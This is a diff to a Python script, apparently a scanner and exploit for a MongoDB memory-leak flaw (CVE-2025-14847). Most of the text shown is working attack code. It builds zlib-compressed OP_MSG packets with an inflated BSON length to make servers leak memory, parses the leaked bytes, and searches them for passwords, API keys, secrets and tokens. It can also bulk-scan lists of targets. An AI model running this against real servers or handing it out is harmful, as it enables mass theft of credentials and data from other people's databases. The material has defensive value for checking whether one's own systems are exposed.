@@ -46,12 +46,12 @@ print_lock = Lock()
 
 
 VULNERABLE_VERSIONS = {
-    "8.2": (0, 2),      
-    "8.0": (0, 16),     
-    "7.0": (0, 27),     
-    "6.0": (0, 26),     
-    "5.0": (0, 31),     
-    "4.4": (0, 29),     
+    "8.2": (0, 2),      # 8.2.0 - 8.2.2 (fixed in 8.2.3)
+    "8.0": (0, 16),     # 8.0.0 - 8.0.16 (fixed in 8.0.17)
+    "7.0": (0, 27),     # 7.0.0 - 7.0.27 (fixed in 7.0.28)
+    "6.0": (0, 26),     # 6.0.0 - 6.0.26 (fixed in 6.0.27)
+    "5.0": (0, 31),     # 5.0.0 - 5.0.31 (fixed in 5.0.32)
+    "4.4": (0, 29),     # 4.4.0 - 4.4.29 (fixed in 4.4.30)
 }
 
 
@@ -63,7 +63,6 @@ class MongoBleedScanner:
         self.verbose = verbose
     
     def send_probe(self, doc_len, buffer_size):
-        """Send crafted BSON with inflated document length to trigger memory leak"""
         try:
             content = b'\x10a\x00\x01\x00\x00\x00'
             
@@ -72,15 +71,15 @@ class MongoBleedScanner:
             op_msg = struct.pack('<I', 0) + b'\x00' + bson
             compressed = zlib.compress(op_msg)
             
-            payload = struct.pack('<I', 2013)  
-            payload += struct.pack('<i', buffer_size)  
-            payload += struct.pack('B', 2)  
+            payload = struct.pack('<I', 2013) 
+            payload += struct.pack('<i', buffer_size) 
+            payload += struct.pack('B', 2) 
             payload += compressed
             
             header = struct.pack('<IIII', 
-                16 + len(payload),  
-                1,                   
-                0,                   
+                16 + len(payload), 
+                1,                  
+                0,                  
                 2012                
             )
             
@@ -113,7 +112,6 @@ class MongoBleedScanner:
             return b''
     
     def extract_leaks(self, response):
-        """Extract leaked data from error response"""
         if len(response) < 25:
             return []
         
@@ -143,7 +141,6 @@ class MongoBleedScanner:
         return leaks
     
     def check_mongodb(self):
-        """Check if target is running MongoDB"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(self.timeout)
@@ -172,7 +169,6 @@ class MongoBleedScanner:
             return False, f"Error: {str(e)}"
     
     def scan(self, min_offset=20, max_offset=500, save_output=None):
-        """Main scan function to detect and exploit CVE-2025-14847"""
         
         print(f"{Fore.CYAN}[*] Checking if target is MongoDB...{Style.RESET_ALL}")
         is_mongodb, msg = self.check_mongodb()
@@ -224,7 +220,6 @@ class MongoBleedScanner:
             return False
     
     def search_secrets(self, data):
-        """Search leaked data for sensitive information"""
         patterns = {
             'passwords': [b'password', b'passwd', b'pwd'],
             'secrets': [b'secret', b'api_key', b'apikey', b'token'],
@@ -263,7 +258,6 @@ class MongoBleedScanner:
 
 
 def scan_target(target, port, timeout, verbose):
-    """Scan a single target (for bulk scanning)"""
     try:
         if ':' in target and not target.count(':') > 1:
             host, target_port = target.rsplit(':', 1)
@@ -307,7 +301,6 @@ def scan_target(target, port, timeout, verbose):
 
 
 def bulk_scan(file_path, port=27017, max_workers=10, timeout=5, verbose=False):
-    """Scan multiple targets from file"""
     try:
         with open(file_path, 'r') as f:
             targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
